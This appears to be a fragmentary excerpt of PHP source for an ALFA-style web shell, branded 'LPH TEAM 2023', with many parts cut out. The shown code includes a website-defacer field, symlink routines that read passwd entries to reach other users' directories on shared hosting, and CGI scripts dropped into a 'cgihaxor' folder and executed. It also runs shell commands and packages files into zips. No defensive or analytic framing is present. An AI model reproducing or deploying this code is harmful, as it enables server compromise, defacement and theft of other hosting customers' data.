...
define("__ALFA_DATA_FOLDER__", "system-area");
...
<input type="text" name="defacer" size="67" id="text" placeholder="LPH TEAM 2023" />
<br>
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgihaxor/'.$cginame);
	}else{
		echo $resource;
	}
}
...
foreach($lines as $line){
	...
	if(!$anonymous){
		...
		$sympath = str_replace("{user}", $owner, $makepwd);$http = "http://".$domain;
		if($state == "passwd"){
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://haxor.lol/love/Leviathan-Perfect-Hunter-transformed.png\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgihaxor/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$tmp_path = alfaWriteTocgiapi("basedir.haxor",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/haxorcgiapi;sh basedir.haxor ".$makepwd,false,true,true);
...
<divclass="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'alfa.zip" size="60"/>
...
function json_decode($json, $array=true){
    ...
    for ($i=0; $i<strlen($json); $i++)
    {
        if (!$comment)
        {
            ...
            else if ($json[$i] == ':'){$out.= '=>';}else {$out .= $json[$i];}
        }
        else $out .= $json[$i];
